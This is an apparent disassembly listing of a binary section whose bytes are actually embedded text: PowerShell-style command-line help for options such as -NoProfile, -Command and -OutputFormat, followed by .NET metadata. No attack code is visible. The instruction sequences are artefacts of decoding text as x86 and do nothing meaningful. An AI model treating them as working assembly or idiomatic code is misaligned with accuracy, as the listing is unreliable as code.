  402d21:	jo     0x402d97
  402d23:	pop    edi
  402d24:	bound  ebp,QWORD PTR [edi+ebp*2+0x63]
  402d28:	imul   edi,DWORD PTR [esi],0x20
  402d2b:	pop    ebx
  402d2c:	and    BYTE PTR ds:0x73677261,ch
  402d32:	and    BYTE PTR [ecx+eiz*2],bh
  402d35:	jb     0x402d9e
  402d37:	jne    0x402da6
  402d39:	outs   dx,BYTE PTR gs:[esi]
  402d3b:	je     0x402d9c
  402d3d:	popa   
  402d3e:	jb     0x402db2
  402d40:	popa   
  402d41:	jns    0x402d81
  402d43:	and    BYTE PTR [ebp+0xd],bl
  402d46:	or     ah,BYTE PTR [eax]
  402d48:	and    BYTE PTR [eax],ah
  402d4a:	and    BYTE PTR [eax],ah
  402d4c:	and    BYTE PTR [eax],ah
  402d4e:	and    BYTE PTR [eax],ah
  402d50:	and    BYTE PTR [eax],ah
  402d52:	and    BYTE PTR [eax],ah
  402d54:	and    BYTE PTR [eax],ah
  402d56:	and    BYTE PTR [eax],ah
  402d58:	and    BYTE PTR [ebp+0xd],bh
  402d5b:	or     ah,BYTE PTR [eax]
  402d5d:	and    BYTE PTR [eax],ah
  402d5f:	and    BYTE PTR [eax],ah
  402d61:	and    BYTE PTR [eax],ah
  402d63:	and    BYTE PTR [ebp+0xd],bl
  402d66:	or     ah,BYTE PTR [eax]
  402d68:	and    BYTE PTR [eax],ah
  402d6a:	and    BYTE PTR [eax],ah
  402d6c:	and    BYTE PTR [ebp+0xd],bl
  402d6f:	or     ah,BYTE PTR [eax]
  402d71:	and    BYTE PTR [eax],ah
  402d73:	and    BYTE PTR [eax],ah
  402d75:	and    BYTE PTR [ebx+0x20],bl
  402d78:	sub    eax,0x706c6548
  402d7d:	and    BYTE PTR [eax+eiz*1+0x2d],bh
  402d81:	aas    
  402d82:	pop    ebp
  402d83:	or     eax,0x2d0a0d0a
  402d88:	dec    esi
  402d89:	outs   dx,DWORD PTR ds:[esi]
  402d8a:	dec    esp
  402d8b:	outs   dx,DWORD PTR ds:[esi]
  402d8c:	outs   dx,DWORD PTR ds:[si]
  402d8e:	or     eax,0x2020200a
  402d93:	and    BYTE PTR [edi+ebp*2+0x20],al
  402d97:	outs   dx,BYTE PTR ds:[esi]
  402d98:	outs   dx,DWORD PTR ds:[esi]
  402d99:	je     0x402dbb
  402d9b:	imul   esi,DWORD PTR fs:[ebx+0x70],0x2079616c
  402da3:	je     0x402e0d
  402da5:	and    BYTE PTR gs:[ebx+0x6f],ah
  402da9:	jo     0x402e24
  402dab:	jb     0x402e16
  402dad:	addr16 push 0x61622074
  402db3:	outs   dx,BYTE PTR ds:[esi]
  402db4:	outs   dx,BYTE PTR ds:[esi]
  402db5:	gs jb  0x402dd8
  402db8:	outs   dx,DWORD PTR ds:[esi]
  402db9:	outs   dx,BYTE PTR ds:[esi]
  402dba:	and    BYTE PTR [ebx+0x74],dh
  402dbd:	popa   
  402dbe:	jb     0x402e34
  402dc0:	jne    0x402e32
  402dc2:	cs or  eax,0x6f4e2d0a
  402dc8:	inc    ebp
  402dc9:	js     0x402e34
  402dcb:	je     0x402dda
  402dcd:	or     ah,BYTE PTR [eax]
  402dcf:	and    BYTE PTR [eax],ah
  402dd1:	and    BYTE PTR [ebx+0x65],cl
  402dd4:	gs jo  0x402df7
  402dd7:	jb     0x402e4e
  402dd9:	outs   dx,BYTE PTR ds:[esi]
  402dda:	outs   dx,BYTE PTR ds:[esi]
  402ddb:	imul   ebp,DWORD PTR [esi+0x67],0x74666120
  402de2:	gs jb  0x402e05
  402de5:	arpl   WORD PTR [edi+0x6d],bp
  402de8:	jo     0x402e56
  402dea:	gs je  0x402e56
  402ded:	outs   dx,BYTE PTR ds:[esi]
  402dee:	and    BYTE PTR [bx+di+0x6c],ah
  402df2:	ins    BYTE PTR es:[edi],dx
  402df3:	and    BYTE PTR [ebx+0x74],dh
  402df6:	popa   
  402df7:	jb     0x402e6d
  402df9:	jne    0x402e6b
  402dfb:	and    BYTE PTR [ebx+0x6f],ah
  402dfe:	ins    DWORD PTR es:[edi],dx
  402dff:	ins    DWORD PTR es:[edi],dx
  402e00:	popa   
  402e01:	outs   dx,BYTE PTR ds:[esi]
  402e02:	fs jae 0x402e33
  402e05:	or     eax,0x6f4e2d0a
  402e0a:	push   eax
  402e0b:	jb     0x402e7c
  402e0d:	imul   bp,WORD PTR [ebp+eiz*2+0xd],0x200a
  402e14:	and    BYTE PTR [eax],ah
  402e16:	and    BYTE PTR [edi+ebp*2+0x20],al
  402e1a:	outs   dx,BYTE PTR ds:[esi]
  402e1b:	outs   dx,DWORD PTR ds:[esi]
  402e1c:	je     0x402e3e
  402e1e:	ins    BYTE PTR es:[edi],dx
  402e1f:	outs   dx,DWORD PTR ds:[esi]
  402e20:	popa   
  402e21:	and    BYTE PTR fs:[ecx+0x20],ah
  402e25:	jne    0x402e9a
  402e27:	gs jb  0x402e4a
  402e2a:	jo     0x402e9e
  402e2c:	outs   dx,DWORD PTR ds:[esi]
  402e2d:	imul   bp,WORD PTR [ebp+eiz*2+0x2e],0xa0d
  402e34:	sub    eax,0x7074754f
  402e39:	jne    0x402eaf
  402e3b:	inc    esi
  402e3c:	outs   dx,DWORD PTR ds:[esi]
  402e3d:	jb     0x402eac
  402e3f:	popa   
  402e40:	je     0x402e4f
  402e42:	or     ah,BYTE PTR [eax]
  402e44:	and    BYTE PTR [eax],ah
  402e46:	and    BYTE PTR [esi+0x6f],al
  402e49:	jb     0x402eb8
  402e4b:	popa   
  402e4c:	je     0x402e6e
  402e4e:	je     0x402eb8
  402e50:	and    BYTE PTR gs:[edi+0x75],ch
  402e54:	je     0x402ec6
  402e56:	jne    0x402ecc
  402e58:	and    BYTE PTR [edi+0x66],ch
  402e5b:	and    BYTE PTR [ecx+0x6c],ah
  402e5e:	ins    BYTE PTR es:[edi],dx
  402e5f:	and    BYTE PTR [edi+0x62],ch
  402e62:	push   0x65
  402e64:	arpl   WORD PTR [ebx+esi*2+0x20],si
  402e68:	popa   
  402e69:	jae    0x402e8b
  402e6b:	imul   esi,DWORD PTR gs:[eax+ebp*2+0x65],0x65742072
  402e74:	js     0x402eea
  402e76:	and    BYTE PTR [ebx+0x74],dh
  402e79:	jb     0x402ee4
  402e7b:	outs   dx,BYTE PTR ds:[esi]
  402e7c:	addr16 jae 0x402e9f
  402e7f:	sub    BYTE PTR [ebp+eiz*2+0x78],dl
  402e83:	je     0x402eae
  402e85:	and    BYTE PTR [edi+0x72],ch
  402e88:	and    BYTE PTR [ecx+0x6e],ch
  402e8b:	and    BYTE PTR [ecx+0xd],ah
  402e8e:	or     ah,BYTE PTR [eax]
  402e90:	and    BYTE PTR [eax],ah
  402e92:	and    BYTE PTR [ebx+0x65],dh
  402e95:	jb     0x402f00
  402e97:	popa   
  402e98:	ins    BYTE PTR es:[edi],dx
  402e99:	imul   edi,DWORD PTR [edx+0x65],0x4c432064
  402ea0:	dec    ecx
  402ea1:	pop    eax
  402ea2:	dec    ebp
  402ea3:	dec    esp
  402ea4:	and    BYTE PTR [esi+0x6f],ah
  402ea7:	jb     0x402f16
  402ea9:	popa   
  402eaa:	je     0x402ecc
  402eac:	sub    BYTE PTR [eax+0x4d],bl
  402eaf:	dec    esp
  402eb0:	sub    DWORD PTR [esi],ebp
  402eb2:	or     eax,0x6e492d0a
  402eb7:	jo     0x402f2e
  402eb9:	je     0x402f01
  402ebb:	outs   dx,DWORD PTR ds:[esi]
  402ebc:	jb     0x402f2b
  402ebe:	popa   
  402ebf:	je     0x402ece
  402ec1:	or     ah,BYTE PTR [eax]
  402ec3:	and    BYTE PTR [eax],ah
  402ec5:	and    BYTE PTR [eax+ebp*2+0x65],dl
  402ec9:	and    BYTE PTR [ecx+0x6e],ch
  402ecc:	jo     0x402f43
  402ece:	je     0x402ef0
  402ed0:	data16 jb 0x402f42
  402ed3:	ins    DWORD PTR es:[edi],dx
  402ed4:	and    BYTE PTR [ebx+0x74],dh
  402ed7:	imul   ebp,DWORD PTR fs:[esi+0x20],0x66207369
  402edf:	outs   dx,DWORD PTR ds:[esi]
  402ee0:	jb     0x402f4f
  402ee2:	popa   
  402ee3:	je     0x402f59
  402ee5:	gs and BYTE PTR fs:[ecx+0x73],ah
  402eea:	and    BYTE PTR [ebp+0x69],ah
  402eed:	je     0x402f57
  402eef:	gs jb  0x402f12
  402ef2:	je     0x402f59
  402ef4:	js     0x402f6a
  402ef6:	and    BYTE PTR [ebx+0x74],dh
  402ef9:	jb     0x402f64
  402efb:	outs   dx,BYTE PTR ds:[esi]
  402efc:	addr16 jae 0x402f1f
  402eff:	sub    BYTE PTR [ebp+eiz*2+0x78],dl
  402f03:	je     0x402f2e
  402f05:	and    BYTE PTR [edi+0x72],ch
  402f08:	and    BYTE PTR [ecx+0x6e],ch
  402f0b:	and    BYTE PTR [ecx+0xd],ah
  402f0e:	or     ah,BYTE PTR [eax]
  402f10:	and    BYTE PTR [eax],ah
  402f12:	and    BYTE PTR [ebx+0x65],dh
  402f15:	jb     0x402f80
  402f17:	popa   
  402f18:	ins    BYTE PTR es:[edi],dx
  402f19:	imul   edi,DWORD PTR [edx+0x65],0x4c432064
  402f20:	dec    ecx
  402f21:	pop    eax
  402f22:	dec    ebp
  402f23:	dec    esp
  402f24:	and    BYTE PTR [esi+0x6f],ah
  402f27:	jb     0x402f96
  402f29:	popa   
  402f2a:	je     0x402f4c
  402f2c:	sub    BYTE PTR [eax+0x4d],bl
  402f2f:	dec    esp
  402f30:	sub    DWORD PTR [esi],ebp
  402f32:	or     eax,0x6f432d0a
  402f37:	ins    DWORD PTR es:[edi],dx
  402f38:	ins    DWORD PTR es:[edi],dx
  402f39:	popa   
  402f3a:	outs   dx,BYTE PTR ds:[esi]
  402f3b:	fs or  eax,0x2020200a
  402f41:	and    BYTE PTR [ebx+0x71],dh
  402f44:	ins    BYTE PTR es:[edi],dx
  402f45:	jo     0x402fba
  402f47:	and    BYTE PTR [edx+0x75],dh
  402f4a:	outs   dx,BYTE PTR ds:[esi]
  402f4b:	jae    0x402f6d
  402f4d:	je     0x402fb7
  402f4f:	and    BYTE PTR gs:[ebx+0x6f],ah
  402f53:	ins    DWORD PTR es:[edi],dx
  402f54:	ins    DWORD PTR es:[edi],dx
  402f55:	popa   
  402f56:	outs   dx,BYTE PTR ds:[esi]
  402f57:	fs jae 0x402f7a
  402f5a:	jae    0x402fcc
  402f5c:	arpl   WORD PTR gs:[ecx+0x66],bp
  402f60:	imul   esp,DWORD PTR [ebp+0x64],0x646e6120
  402f67:	and    BYTE PTR [eax+ebp*2+0x65],dh
  402f6b:	outs   dx,BYTE PTR ds:[esi]
  402f6c:	and    BYTE PTR [ebp+0x78],ah
  402f6f:	imul   esi,DWORD PTR [ebx+esi*2+0x2c],0x6c6e7520
  402f77:	gs jae 0x402fed
  402f7a:	and    BYTE PTR ds:0x78456f4e,ch
  402f80:	imul   esi,DWORD PTR [eax+eiz*1+0x69],0x6c612073
  402f88:	jae    0x402ff9
  402f8a:	or     eax,0x2020200a
  402f8f:	and    BYTE PTR [ebx+0x70],dh
  402f92:	arpl   WORD PTR gs:[ecx+0x66],bp
  402f96:	imul   esp,DWORD PTR [ebp+0x64],0x6f44202e
  402f9d:	and    BYTE PTR [esi+0x6f],ch
  402fa0:	je     0x402fc2
  402fa2:	jae    0x403014
  402fa4:	arpl   WORD PTR gs:[ecx+0x66],bp
  402fa8:	jns    0x402fca
  402faa:	outs   dx,DWORD PTR ds:[esi]
  402fab:	je     0x403015
  402fad:	gs jb  0x402fd0
  402fb0:	arpl   WORD PTR [eax+0x61],bp
  402fb3:	jb     0x403016
  402fb5:	arpl   WORD PTR [ebp+eiz*2+0x72],si
  402fb9:	jae    0x402fdb
  402fbb:	popa   
  402fbc:	data16 je 0x403024
  402fbf:	jb     0x402fe1
  402fc1:	je     0x40302b
  402fc3:	and    BYTE PTR gs:0x6d6d6f43,ch
  402fca:	popa   
  402fcb:	outs   dx,BYTE PTR ds:[esi]
  402fcc:	and    BYTE PTR fs:[ebx+0x77],dh
  402fd0:	imul   esi,DWORD PTR [ebx+eiz*2+0x68],0x200a0d2c
  402fd8:	and    BYTE PTR [eax],ah
  402fda:	and    BYTE PTR [eax+ebp*2+0x65],dh
  402fde:	jns    0x403000
  402fe0:	ja     0x40304b
  402fe2:	ins    BYTE PTR es:[edi],dx
  402fe3:	ins    BYTE PTR es:[edi],dx
  402fe4:	and    BYTE PTR [edx+0x65],ah
  402fe7:	and    BYTE PTR [edx+0x65],dh
  402fea:	popa   
  402feb:	and    BYTE PTR fs:[ecx+0x73],ah
  402fef:	and    BYTE PTR [ebx+0x6f],ah
  402ff2:	ins    DWORD PTR es:[edi],dx
  402ff3:	ins    DWORD PTR es:[edi],dx
  402ff4:	popa   
  402ff5:	outs   dx,BYTE PTR ds:[esi]
  402ff6:	and    BYTE PTR fs:[ecx+0x72],ah
  402ffa:	addr16 jne 0x40306a
  402ffd:	outs   dx,BYTE PTR gs:[esi]
  402fff:	je     0x403074
  403001:	cs or  eax,0x2020200a
  403007:	and    BYTE PTR [eax],ah
  403009:	and    BYTE PTR ds:0x20200a0d,ch
  40300f:	and    BYTE PTR [eax],ah
  403011:	and    BYTE PTR [eax],ah
  403013:	and    BYTE PTR [eax],ah
  403015:	and    BYTE PTR [eax],ah
  403017:	push   edx
  403018:	gs popa 
  40301a:	and    BYTE PTR fs:[ecx+0x6e],ch
  40301e:	jo     0x403095
  403020:	je     0x403042
  403022:	arpl   WORD PTR [edi+0x6d],bp
  403025:	ins    DWORD PTR es:[edi],dx
  403026:	popa   
  403027:	outs   dx,BYTE PTR ds:[esi]
  403028:	fs jae 0x40304b
  40302b:	data16 jb 0x40309d
  40302e:	ins    DWORD PTR es:[edi],dx
  40302f:	and    BYTE PTR [eax+ebp*2+0x65],dh
  403033:	and    BYTE PTR [ebx+0x65],ch
  403036:	jns    0x40309a
  403038:	outs   dx,DWORD PTR ds:[esi]
  403039:	popa   
  40303a:	jb     0x4030a0
  40303c:	and    BYTE PTR [edx+0x79],ah
  40303f:	and    BYTE PTR [ebp+0x73],dh
  403042:	imul   ebp,DWORD PTR [esi+0x67],0x64747320
  403049:	imul   ebp,DWORD PTR [esi+0x2e],0x20200a0d
  403050:	and    BYTE PTR [eax],ah
  403052:	and    BYTE PTR [eax],ah
  403054:	cmp    al,0x73
  403056:	je     0x4030ca
  403058:	imul   ebp,DWORD PTR [esi+0x67],0x205b203e
  40305f:	cmp    al,0x63
  403061:	outs   dx,DWORD PTR ds:[esi]
  403062:	ins    DWORD PTR es:[edi],dx
  403063:	ins    DWORD PTR es:[edi],dx
  403064:	popa   
  403065:	outs   dx,BYTE PTR ds:[esi]
  403066:	fs pop edi
  403068:	jo     0x4030cb
  40306a:	jb     0x4030cd
  40306c:	ins    DWORD PTR es:[edi],dx
  40306d:	gs je  0x4030d5
  403070:	jb     0x4030e5
  403072:	and    BYTE PTR ds:[ebp+0xd],bl
  403076:	or     ah,BYTE PTR [eax]
  403078:	and    BYTE PTR [eax],ah
  40307a:	and    BYTE PTR [eax],ah
  40307c:	and    BYTE PTR [eax],ah
  40307e:	and    BYTE PTR [eax],ah
  403080:	and    BYTE PTR [ebx+0x70],dl
  403083:	arpl   WORD PTR gs:[ecx+0x66],bp
  403087:	imul   esp,DWORD PTR [ebp+0x73],0x73206120
  40308e:	je     0x403102
  403090:	imul   ebp,DWORD PTR [esi+0x67],0x6e6f6320
  403097:	je     0x4030fa
  403099:	imul   ebp,DWORD PTR [esi+0x69],0x7420676e
  4030a0:	push   0x6f502065
  4030a5:	ja     0x40310c
  4030a7:	jb     0x4030fc
  4030a9:	push   0x206c6c65
  4030ae:	arpl   WORD PTR [edi+0x6d],bp
  4030b1:	ins    DWORD PTR es:[edi],dx
  4030b2:	popa   
  4030b3:	outs   dx,BYTE PTR ds:[esi]
  4030b4:	fs jae 0x4030d7
  4030b7:	je     0x403128
  4030b9:	and    BYTE PTR [edx+0x65],ah
  4030bc:	and    BYTE PTR [edx+0x75],dh
  4030bf:	outs   dx,BYTE PTR ds:[esi]
  4030c0:	and    BYTE PTR cs:[ebp+0x73],dh
  4030c4:	gs or  eax,0x2020200a
  4030ca:	and    BYTE PTR [eax],ah
  4030cc:	and    BYTE PTR [eax],ah
  4030ce:	and    BYTE PTR [eax],ah
  4030d0:	and    BYTE PTR [eax+ebp*2+0x65],dh
  4030d4:	and    BYTE PTR [esi+0x6f],ah
  4030d7:	jb     0x403146
  4030d9:	popa   
  4030da:	je     0x4030fc
  4030dc:	and    ah,BYTE PTR [esi]
  4030de:	jnp    0x40311c
  4030e0:	arpl   WORD PTR [edi+0x6d],bp
  4030e3:	ins    DWORD PTR es:[edi],dx
  4030e4:	popa   
  4030e5:	outs   dx,BYTE PTR ds:[esi]
  4030e6:	fs ds jge 0x40310c
  4030ea:	and    BYTE PTR cs:[eax+ebp*2+0x65],dl
  4030ef:	and    BYTE PTR [ecx+0x75],dh
  4030f2:	outs   dx,DWORD PTR ds:[esi]
  4030f3:	je     0x403156
  4030f5:	je     0x403160
  4030f7:	outs   dx,DWORD PTR ds:[esi]
  4030f8:	outs   dx,BYTE PTR ds:[esi]
  4030f9:	and    BYTE PTR [ebp+0x61],ch
  4030fc:	jb     0x403169
  4030fe:	jae    0x403120
  403100:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x79666974
  403108:	and    BYTE PTR [ecx+0x20],ah
  40310b:	jae    0x403181
  40310d:	jb     0x403178
  40310f:	outs   dx,BYTE PTR ds:[esi]
  403110:	and    BYTE PTR [bx+di+0x6e],ah
  403114:	fs or  eax,0x2020200a
  40311a:	and    BYTE PTR [eax],ah
  40311c:	and    BYTE PTR [eax],ah
  40311e:	and    BYTE PTR [eax],ah
  403120:	and    BYTE PTR [eax+ebp*2+0x65],dh
  403124:	and    BYTE PTR [ecx+0x6e],ch
  403127:	jbe    0x403198
  403129:	arpl   WORD PTR [ecx+0x74],sp
  40312c:	imul   ebp,DWORD PTR [edi+0x6e],0x65706f20
  403133:	jb     0x403196
  403135:	je     0x4031a6
  403137:	jb     0x403159
  403139:	sub    BYTE PTR [esi],ah
  40313b:	sub    DWORD PTR [eax],esp
  40313d:	arpl   WORD PTR [ecx+0x75],sp
  403140:	jae    0x4031a7
  403142:	jae    0x403164
  403144:	jae    0x4031b7
  403146:	ins    BYTE PTR es:[edi],dx
  403147:	jo     0x4031bc
  403149:	and    BYTE PTR [edi+ebp*2+0x20],dh
  40314d:	jb     0x4031c4
  40314f:	outs   dx,BYTE PTR ds:[esi]
  403150:	and    BYTE PTR [eax+ebp*2+0x65],dh
  403154:	and    BYTE PTR [ebx+0x6f],ah
  403157:	ins    DWORD PTR es:[edi],dx
  403158:	ins    DWORD PTR es:[edi],dx
  403159:	popa   
  40315a:	outs   dx,BYTE PTR ds:[esi]
  40315b:	fs cs or eax,0x2020200a
  403162:	and    BYTE PTR [eax],ah
  403164:	and    BYTE PTR [ebx+esi*2],bh
  403167:	arpl   WORD PTR [edx+0x69],si
  40316a:	jo     0x4031e0
  40316c:	pop    edi
  40316d:	bound  ebp,QWORD PTR [edi+ebp*2+0x63]
  403171:	imul   edi,DWORD PTR [esi],0x20
  403174:	pop    ebx
  403175:	and    BYTE PTR ds:0x73677261,ch
  40317b:	and    BYTE PTR [ecx+eiz*2],bh
  40317e:	jb     0x4031e7
  403180:	jne    0x4031ef
  403182:	outs   dx,BYTE PTR gs:[esi]
  403184:	je     0x4031e5
  403186:	popa   
  403187:	jb     0x4031fb
  403189:	popa   
  40318a:	jns    0x4031ca
  40318c:	and    BYTE PTR [ebp+0xd],bl
  40318f:	or     ah,BYTE PTR [eax]
  403191:	and    BYTE PTR [eax],ah
  403193:	and    BYTE PTR [eax],ah
  403195:	and    BYTE PTR [eax],ah
  403197:	and    BYTE PTR [eax],ah
  403199:	and    BYTE PTR [ebx+0x70],dl
  40319c:	arpl   WORD PTR gs:[ecx+0x66],bp
  4031a0:	imul   esp,DWORD PTR [ebp+0x73],0x62206120
  4031a7:	ins    BYTE PTR es:[edi],dx
  4031a8:	outs   dx,DWORD PTR ds:[esi]
  4031a9:	arpl   WORD PTR [ebx+0x20],bp
  4031ac:	outs   dx,DWORD PTR ds:[esi]
  4031ad:	data16 and BYTE PTR [eax+0x6f],dl
  4031b1:	ja     0x403218
  4031b3:	jb     0x403208
  4031b5:	push   0x206c6c65
  4031ba:	arpl   WORD PTR [edi+0x6d],bp
  4031bd:	ins    DWORD PTR es:[edi],dx
  4031be:	popa   
  4031bf:	outs   dx,BYTE PTR ds:[esi]
  4031c0:	fs jae 0x4031e3
  4031c3:	je     0x403234
  4031c5:	and    BYTE PTR [edx+0x65],ah
  4031c8:	and    BYTE PTR [edx+0x75],dh
  4031cb:	outs   dx,BYTE PTR ds:[esi]
  4031cc:	and    BYTE PTR cs:[ebp+0x73],dl
  4031d0:	and    BYTE PTR gs:[eax+ebp*2+0x65],dh
  4031d5:	and    BYTE PTR [esi+0x6f],ah
  4031d8:	jb     0x403247
  4031da:	popa   
  4031db:	je     0x4031ea
  4031dd:	or     ah,BYTE PTR [eax]
  4031df:	and    BYTE PTR [eax],ah
  4031e1:	and    BYTE PTR [eax],ah
  4031e3:	and    BYTE PTR [eax],ah
  4031e5:	and    BYTE PTR [eax],ah
  4031e7:	and    BYTE PTR [ebx+0x3c],bh
  4031ea:	jae    0x40324f
  4031ec:	jb     0x403257
  4031ee:	jo     0x403264
  4031f0:	pop    edi
  4031f1:	bound  ebp,QWORD PTR [edi+ebp*2+0x63]
  4031f5:	imul   edi,DWORD PTR [esi],0x7d
  4031f8:	cs or  eax,0x65482d0a
  4031fe:	ins    BYTE PTR es:[edi],dx
  4031ff:	jo     0x403221
  403201:	jl     0x403223
  403203:	sub    eax,0x200a0d3f
  403208:	and    BYTE PTR [eax],ah
  40320a:	and    BYTE PTR [ebx+0x68],dl
  40320d:	outs   dx,DWORD PTR ds:[esi]
  40320e:	ja     0x403230
  403210:	je     0x40327a
  403212:	and    BYTE PTR gs:[ebx+0x79],dh
  403216:	outs   dx,BYTE PTR ds:[esi]
  403217:	je     0x40327a
  403219:	js     0x40323b
  40321b:	jae    0x403292
  40321d:	ins    DWORD PTR es:[edi],dx
  40321e:	ins    DWORD PTR es:[edi],dx
  40321f:	popa   
  403220:	jb     0x40329b
  403222:	and    BYTE PTR [eax+0x65],ch
  403225:	ins    BYTE PTR es:[edi],dx
  403226:	jo     0x403256
  403228:	or     eax,0x5456010a
  40322d:	push   0x6f6a2065
  403232:	bound  esp,QWORD PTR [eax]
  403234:	jae    0x403299
  403236:	jb     0x4032a1
  403238:	jo     0x4032ae
  40323a:	and    BYTE PTR [ebp+0x6e],ah
  40323d:	arpl   WORD PTR [edi+0x75],bp
  403240:	outs   dx,BYTE PTR ds:[esi]
  403241:	je     0x4032a8
  403243:	jb     0x4032aa
  403245:	and    BYTE PTR fs:[eax+ebp*2+0x65],dh
  40324a:	and    BYTE PTR [esi+0x6f],ah
  40324d:	ins    BYTE PTR es:[edi],dx
  40324e:	ins    BYTE PTR es:[edi],dx
  40324f:	outs   dx,DWORD PTR ds:[esi]
  403250:	ja     0x4032bb
  403252:	outs   dx,BYTE PTR ds:[esi]
  403253:	and    BYTE PTR [di+0x72],ah
  403257:	jb     0x4032c8
  403259:	jb     0x4032ce
  40325b:	and    BYTE PTR cs:[eax+ebp*2+0x65],dl
  403260:	jae    0x4032c7
  403262:	and    BYTE PTR [ebp+0x72],ah
  403265:	jb     0x4032d6
  403267:	jb     0x4032dc
  403269:	and    BYTE PTR [ecx+ebp*2+0x64],ah
  40326d:	and    BYTE PTR [esi+0x6f],ch
  403270:	je     0x403292
  403272:	jae    0x4032e8
  403274:	outs   dx,DWORD PTR ds:[esi]
  403275:	jo     0x403297
  403277:	je     0x4032e1
  403279:	and    BYTE PTR gs:[ebx+0x63],dh
  40327d:	jb     0x4032e8
  40327f:	jo     0x4032f5
  403281:	cmp    al,BYTE PTR [ecx]
  403283:	ret    
  403284:	add    DWORD PTR [ecx+0x20],eax
  403287:	push   0x6f
  403289:	bound  esp,QWORD PTR [eax]
  40328b:	jae    0x403301
  40328d:	gs jo  0x4032b0
  403290:	jb     0x4032f7
  403292:	arpl   WORD PTR [ebp+0x69],sp
  403295:	jbe    0x4032fc
  403297:	and    BYTE PTR fs:[ecx+0x6e],ah
  40329b:	and    BYTE PTR [ebp+0x72],ah
  40329e:	jb     0x40330f
  4032a0:	jb     0x4032c2
  4032a2:	popa   
  4032a3:	je     0x4032c5
  4032a5:	ins    BYTE PTR es:[edi],dx
  4032a6:	imul   ebp,DWORD PTR [esi+0x65],0x7d307b20
  4032ad:	and    BYTE PTR [ecx+0x6e],ch
  4032b0:	and    BYTE PTR [ecx+0x20],ah
  4032b3:	push   eax
  4032b4:	outs   dx,DWORD PTR ds:[esi]
  4032b5:	ja     0x40331c
  4032b7:	jb     0x40330c
  4032b9:	push   0x206c6c65
  4032be:	jae    0x403323
  4032c0:	jb     0x40332b
  4032c2:	jo     0x403338
  4032c4:	and    BYTE PTR cs:[eax+ebp*2+0x65],dl
  4032c9:	and    BYTE PTR [ebx+0x6f],ah
  4032cc:	jb     0x403340
  4032ce:	gs jae 0x403341
  4032d1:	outs   dx,DWORD PTR ds:[esi]
  4032d2:	outs   dx,BYTE PTR ds:[esi]
  4032d3:	imul   ebp,DWORD PTR fs:[esi+0x67],0x6e696c20
  4032db:	and    BYTE PTR gs:[ecx+0x73],ch
  4032df:	and    BYTE PTR [edi],ah
  4032e1:	jnp    0x403314
  4032e3:	jge    0x40330c
  4032e5:	and    BYTE PTR cs:[ebx+0x6f],al
  4032e9:	jb     0x40335d
  4032eb:	arpl   WORD PTR gs:[eax+eiz*1+0x74],si
  4032f0:	push   0x63732065
  4032f5:	jb     0x403360
  4032f7:	jo     0x40336d
  4032f9:	and    BYTE PTR [ecx+0x6e],ah
  4032fc:	and    BYTE PTR fs:[edx+0x65],dh
  403300:	jae    0x403365
  403302:	push   0x6c756465
  403307:	and    BYTE PTR gs:[eax+ebp*2+0x65],dh
  40330c:	and    BYTE PTR [edx+0x6f],ch
  40330f:	bound  ebp,QWORD PTR [esi]
  403311:	and    BYTE PTR [eax+ebp*2+0x65],dl
  403315:	and    BYTE PTR [ebp+0x72],ah
  403318:	jb     0x403389
  40331a:	jb     0x40333c
  40331c:	imul   ebp,DWORD PTR [esi+0x66],0x616d726f
  403323:	je     0x40338e
  403325:	outs   dx,DWORD PTR ds:[esi]
  403326:	outs   dx,BYTE PTR ds:[esi]
  403327:	and    BYTE PTR [edx+0x65],dh
  40332a:	je     0x4033a1
  40332c:	jb     0x40339c
  40332e:	gs and BYTE PTR fs:[edx+0x79],ah
  403333:	and    BYTE PTR [eax+0x6f],dl
  403336:	ja     0x40339d
  403338:	jb     0x40338d
  40333a:	push   0x206c6c65
  40333f:	imul   esi,DWORD PTR [ebx+0x3a],0x327b2720
  403346:	jge    0x40336f
  403348:	add    DWORD PTR [esi+0x6a204101],edx
  40334e:	outs   dx,DWORD PTR ds:[esi]
  40334f:	bound  esp,QWORD PTR [eax]
  403351:	jae    0x4033c7
  403353:	gs jo  0x403376
  403356:	jb     0x4033bd
  403358:	arpl   WORD PTR [ebp+0x69],sp
  40335b:	jbe    0x4033c2
  40335d:	and    BYTE PTR fs:[ecx+0x6e],ah
  403361:	and    BYTE PTR [ebp+0x72],ah
  403364:	jb     0x4033d5
  403366:	jb     0x403388
  403368:	imul   ebp,DWORD PTR [esi+0x20],0x6f502061
  40336f:	ja     0x4033d6
  403371:	jb     0x4033c6
  403373:	push   0x206c6c65
  403378:	jae    0x4033dd
  40337a:	jb     0x4033e5
  40337c:	jo     0x4033f2
  40337e:	and    BYTE PTR cs:[ebx+0x6f],al
  403382:	jb     0x4033f6
  403384:	arpl   WORD PTR gs:[eax+eiz*1+0x74],si
  403389:	push   0x63732065
  40338e:	jb     0x4033f9
  403390:	jo     0x403406
  403392:	and    BYTE PTR [ecx+0x6e],ah
  403395:	and    BYTE PTR fs:[edx+0x65],dh
  403399:	jae    0x4033fe
  40339b:	push   0x6c756465
  4033a0:	and    BYTE PTR gs:[eax+ebp*2+0x65],dh
  4033a5:	and    BYTE PTR [edx+0x6f],ch
  4033a8:	bound  ebp,QWORD PTR [esi]
  4033aa:	and    BYTE PTR [eax+ebp*2+0x65],dl
  4033ae:	and    BYTE PTR [ebp+0x72],ah
  4033b1:	jb     0x403422
  4033b3:	jb     0x4033d5
  4033b5:	imul   ebp,DWORD PTR [esi+0x66],0x616d726f
  4033bc:	je     0x403427
  4033be:	outs   dx,DWORD PTR ds:[esi]
  4033bf:	outs   dx,BYTE PTR ds:[esi]
  4033c0:	and    BYTE PTR [edx+0x65],dh
  4033c3:	je     0x40343a
  4033c5:	jb     0x403435
  4033c7:	gs and BYTE PTR fs:[edx+0x79],ah
  4033cc:	and    BYTE PTR [eax+0x6f],dl
  4033cf:	ja     0x403436
  4033d1:	jb     0x403426
  4033d3:	push   0x206c6c65
  4033d8:	imul   esi,DWORD PTR [ebx+0x3a],0x327b2720
  4033df:	jge    0x403408
  4033e1:	add    BYTE PTR [eax],al
  4033e3:	add    BYTE PTR [edx+0x53],al
  4033e6:	dec    edx
  4033e7:	inc    edx
  4033e8:	add    DWORD PTR [eax],eax
  4033ea:	add    DWORD PTR [eax],eax
  4033ec:	add    BYTE PTR [eax],al
  4033ee:	add    BYTE PTR [eax],al
  4033f0:	or     al,0x0
  4033f2:	add    BYTE PTR [eax],al
  4033f4:	jbe    0x403428
  4033f6:	xor    BYTE PTR cs:[esi],ch
  4033f9:	xor    eax,0x37323730
  4033fe:	add    BYTE PTR [eax],al
  403400:	add    BYTE PTR [eax],al
